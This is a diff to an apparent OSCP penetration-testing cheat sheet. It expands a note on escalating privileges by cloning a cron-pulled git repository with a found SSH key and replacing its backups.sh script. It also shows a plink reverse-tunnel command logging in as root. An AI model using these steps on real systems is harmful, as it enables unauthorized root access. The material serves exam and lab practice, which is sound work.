@@ -177,8 +177,11 @@ plink -l root -pw pass -R 3389:<localhost>:3389 <remote host>
 
 #### Git Privesc with SSH Key
 
-Was in /git-server directory, ssh found in /home/git/.ssh, cronjobs were pulling
+Was in /git-server directory, ssh found in /home/git/.ssh, cronjobs were pulling. For the OSCP, keep your branch as master for their cronjob and do it on your local machine.
+
 ```bash
+git config --global user.name "kali"
+git config --global user.email "kali@kali"
 GIT_SSH_COMMAND='ssh -i ~/.ssh/id_rsa -p 43022' git clone git@192.168.213.125:/git-server
 cd git-server/
 cp ../backups.sh .
